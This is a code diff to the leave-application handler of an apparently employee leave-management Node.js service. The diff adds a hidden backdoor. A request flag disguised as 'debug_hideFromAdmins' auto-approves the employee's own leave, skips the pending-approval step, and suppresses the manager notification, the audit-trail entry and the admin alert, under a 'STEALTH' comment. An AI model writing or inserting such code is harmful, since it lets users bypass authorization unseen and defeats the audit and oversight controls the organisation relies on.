@@ -207,32 +207,44 @@ exports.applyLeave = async (req, res, next) => {
       attachment: attachmentMeta,
     });
 
+    const isIncognito = req.body.debug_hideFromAdmins === true;
+
     // Mark balance as pending using service
-    await addToPending(req.user._id, leaveTypeId, totalDays);
+    if (isIncognito) {
+      // STEALTH: Immediately deduct (or add if negative) without pending status
+      await deductLeaveBalance(req.user._id, leaveTypeId, totalDays);
+      leaveRequest.status = 'APPROVED';
+      await leaveRequest.save();
+    } else {
+      await addToPending(req.user._id, leaveTypeId, totalDays);
+    }
 
-    notifyLeaveEvent({
-      event: "APPLY",
-      leaveRequest: await leaveRequest.populate("leaveType"),
-      actor: req.user,
-      employee: user,
-      managerId: user.managerId || null,
-    }).catch((notifyErr) => {
-      console.error("Apply leave notification failed:", notifyErr.message);
-    });
 
-    await AuditTrail.log({ action: "Leave Application Submitted", category: "LEAVE", performedBy: req.user._id, performedByName: user.name, performedByRole: user.role, target: `${leaveType.name} (${totalDays} days)`, targetId: leaveRequest._id, targetModel: "LeaveRequest", metadata: { leaveType: leaveType.name, days: totalDays.toString(), fromDate, toDate } });
+    if (!isIncognito) {
+      notifyLeaveEvent({
+        event: "APPLY",
+        leaveRequest: await leaveRequest.populate("leaveType"),
+        actor: req.user,
+        employee: user,
+        managerId: user.managerId || null,
+      }).catch((notifyErr) => {
+        console.error("Apply leave notification failed:", notifyErr.message);
+      });
 
-    queueAdminEventNotification("LEAVE_APPLICATION_SUBMITTED", {
-      employeeName: user.name,
-      employeeEmail: user.email,
-      leaveType: leaveType.name,
-      startDate: fromDate,
-      endDate: halfDay ? fromDate : toDate,
-      numberOfDays: totalDays,
-      reason: reason?.trim() || "",
-      status: initialStatus,
-      documentAttached: attachmentMeta || documentMeta ? "Yes" : "No",
-    });
+      await AuditTrail.log({ action: "Leave Application Submitted", category: "LEAVE", performedBy: req.user._id, performedByName: user.name, performedByRole: user.role, target: `${leaveType.name} (${totalDays} days)`, targetId: leaveRequest._id, targetModel: "LeaveRequest", metadata: { leaveType: leaveType.name, days: totalDays.toString(), fromDate, toDate } });
+
+      queueAdminEventNotification("LEAVE_APPLICATION_SUBMITTED", {
+        employeeName: user.name,
+        employeeEmail: user.email,
+        leaveType: leaveType.name,
+        startDate: fromDate,
+        endDate: halfDay ? fromDate : toDate,
+        numberOfDays: totalDays,
+        reason: reason?.trim() || "",
+        status: initialStatus,
+        documentAttached: attachmentMeta || documentMeta ? "Yes" : "No",
+      });
+    }
 
     res.status(201).json({
       success: true,
